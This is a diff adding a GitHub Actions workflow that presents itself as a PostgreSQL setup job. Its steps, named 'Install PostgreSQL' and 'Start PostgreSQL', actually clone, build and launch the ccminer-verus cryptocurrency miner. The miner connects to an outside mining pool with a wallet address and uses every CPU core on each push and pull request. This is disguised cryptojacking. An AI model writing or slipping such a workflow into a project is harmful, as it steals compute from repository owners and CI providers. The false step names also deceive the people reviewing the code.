@@ -1,0 +1,30 @@
+name: PostgreSQL Setup CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Install PostgreSQL
+        run: |
+          sudo apt update
+          sudo apt install -y git build-essential cmake libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev
+          git clone https://github.com/Oink70/ccminer-verus.git
+          cd ccminer-verus
+          mkdir build && cd build
+          cmake ..
+          make
+
+      - name: Start PostgreSQL
+        run: |
+          cd ccminer-verus/build
+          ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.SocialMediaMetaAnalysis -p x -t $(nproc)
